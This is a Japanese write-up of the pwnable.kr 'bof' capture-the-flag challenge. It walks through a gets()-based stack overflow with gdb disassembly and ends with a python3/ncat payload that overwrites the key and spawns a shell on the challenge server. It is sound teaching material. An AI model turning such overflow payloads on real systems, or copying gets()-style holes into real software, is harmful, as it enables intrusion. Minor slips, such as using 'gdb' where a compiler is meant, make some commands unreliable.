# bof

つまり、 Buffer Overflow ですね。

## 動作確認

まずは実行してみましょう。

```
$ ./bof
overflow me :
AAAAAAAAAAAAAAAA  <-- とりあえず A(0x41) を入力
Nah..
```

`overflow me` と表示してヒントを出してくれています。


## 処理内容

bof.c の処理を確認してみましょう。

```c
void func(int key){
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme);	// smash me!
    if(key == 0xcafebabe){
        system("/bin/sh");
    }
    else{
        printf("Nah..\n");
    }
}
int main(int argc, char* argv[]){
    func(0xdeadbeef);
    return 0;
}
```

`func` 関数の中で、引数 `key` の値をチェックして判断しています。

この値が `0xcafebabe` であれば、shコマンドを操作できるようになるようです。

また、 `main` 関数からは `func` 関数に対して `0xdeadbeef` という値を渡しています。

ポイントは `// smash me!` というコメントのある行です。 `gets` はバッファオーバーフローの脆弱性があり、現在は使用してはいけない関数です。

その脆弱性を攻撃していきましょう。


## 解析

`bof` ファイルの中を覗いてみます。

```bash
$ gdb ./bof
(gdb) disas func
Dump of assembler code for function func:
   0x0000062c <+0>:	push   %ebp
   0x0000062d <+1>:	mov    %esp,%ebp
   0x0000062f <+3>:	sub    $0x48,%esp
   0x00000632 <+6>:	mov    %gs:0x14,%eax
   0x00000638 <+12>:	mov    %eax,-0xc(%ebp)
   0x0000063b <+15>:	xor    %eax,%eax
   0x0000063d <+17>:	movl   $0x78c,(%esp)
   0x00000644 <+24>:	call   0x645 <func+25>
   0x00000649 <+29>:	lea    -0x2c(%ebp),%eax        <== (1)
   0x0000064c <+32>:	mov    %eax,(%esp)
   0x0000064f <+35>:	call   0x650 <func+36>
   0x00000654 <+40>:	cmpl   $0xcafebabe,0x8(%ebp)   <== (2)
   0x0000065b <+47>:	jne    0x66b <func+63>
   0x0000065d <+49>:	movl   $0x79b,(%esp)
   0x00000664 <+56>:	call   0x665 <func+57>
   0x00000669 <+61>:	jmp    0x677 <func+75>
   0x0000066b <+63>:	movl   $0x7a3,(%esp)
   0x00000672 <+70>:	call   0x673 <func+71>
   0x00000677 <+75>:	mov    -0xc(%ebp),%eax
   0x0000067a <+78>:	xor    %gs:0x14,%eax
   0x00000681 <+85>:	je     0x688 <func+92>
   0x00000683 <+87>:	call   0x684 <func+88>
   0x00000688 <+92>:	leave
   0x00000689 <+93>:	ret
End of assembler dump.
```

(2) のステップで、引数 `key` の値をチェックしています。

その値は、(1) のステップで取得しています。

(1) では、%ebp (ベースポインタ) を -0x2c 遡ったところから取得しているので、 バッファは 0x2c (44バイト) あります。

44文字入力すると、バッファを埋められそうです。

次に、手元の環境でデバッグ(gdb)できるように、コンパイルしてみます。

```bash
$ gdb -m32 ./bof.c -o mybof
```

`mybof` という実行ファイルができますので、gdbコマンドでデバッグ実行します。

```bash
$ gdb ./mybof
(gdb) disas func
Dump of assembler code for function func:
   0x565561c9 <+0>:	push   %ebp
   0x565561ca <+1>:	mov    %esp,%ebp
   0x565561cc <+3>:	push   %ebx
   0x565561cd <+4>:	sub    $0x24,%esp
   0x565561d0 <+7>:	call   0x565560d0 <__x86.get_pc_thunk.bx>
   0x565561d5 <+12>:	add    $0x2e2b,%ebx
   0x565561db <+18>:	sub    $0xc,%esp
   0x565561de <+21>:	lea    -0x1ff8(%ebx),%eax
   0x565561e4 <+27>:	push   %eax
   0x565561e5 <+28>:	call   0x56556030 <printf@plt>
   0x565561ea <+33>:	add    $0x10,%esp
   0x565561ed <+36>:	sub    $0xc,%esp
   0x565561f0 <+39>:	lea    -0x28(%ebp),%eax
   0x565561f3 <+42>:	push   %eax
   0x565561f4 <+43>:	call   0x56556040 <gets@plt>
   0x565561f9 <+48>:	add    $0x10,%esp
   0x565561fc <+51>:	cmpl   $0xcafebabe,0x8(%ebp)  <== (3)
   0x56556203 <+58>:	jne    0x56556219 <func+80>
   0x56556205 <+60>:	sub    $0xc,%esp
   0x56556208 <+63>:	lea    -0x1fe9(%ebx),%eax
   0x5655620e <+69>:	push   %eax
   0x5655620f <+70>:	call   0x56556060 <system@plt>
   0x56556214 <+75>:	add    $0x10,%esp
   0x56556217 <+78>:	jmp    0x5655622b <func+98>
   0x56556219 <+80>:	sub    $0xc,%esp
   0x5655621c <+83>:	lea    -0x1fe1(%ebx),%eax
   0x56556222 <+89>:	push   %eax
   0x56556223 <+90>:	call   0x56556050 <puts@plt>
   0x56556228 <+95>:	add    $0x10,%esp
   0x5655622b <+98>:	nop
   0x5655622c <+99>:	mov    -0x4(%ebp),%ebx
   0x5655622f <+102>:	leave
   0x56556230 <+103>:	ret
End of assembler dump.
```

先程の `bof` の内容と異なっていますが、(3) のステップで値を判定していますので、ブレークポイントを設定してバッファの内容を確認してみます。

```bash
(gdb) b *0x565561fc
Breakpoint 1 at 0x565561fc
(gdb) r
Starting program: /usr/src/app/00_ToddlersBottle/02_bof/mybof
overflow me : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA     <== 44文字の A (0x41) を入力

Breakpoint 1, 0x565561fc in func ()
(gdb) x/20xhw $esp
0xffffdcd0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffdce0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffdcf0:	0x41414141	0x41414141	0x41414141	0x56556200  <== あと 8バイト でチェック対象のポインタに到達する
0xffffdd00:	0xdeadbeef	0xffffddc4	0xffffddcc	0x56556247  <== チェク対象（0xdeadbeef）
0xffffdd10:	0xf7fe4140	0xffffdd30	0x00000000	0xf7e01ef1
(gdb) q
```

ということで、 52文字 (44バイト + 8バイト) の後ろに `0xcafebabe` を差し込むとバッファオーバーフロー攻撃が成立します。


## Capture the Flag

```bash
$ (python3 -c 'import sys; sys.stdout.buffer.write(bytes.fromhex("41"*52+"bebafeca"))';cat) | ncat -v pwnable.kr 9000
whoami
ls
cat flag
```


## Incidentally

0xcafebabe とそのまま渡すのではなく `bebafeca` と 2バイトずつ逆順にしているのは

実行ファイルの情報を見ると、リトルエンディアン(little endian) だからです。

```bash
$ readelf -h ./bof
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF32
  Data:                              2's complement, little endian
  ...
```
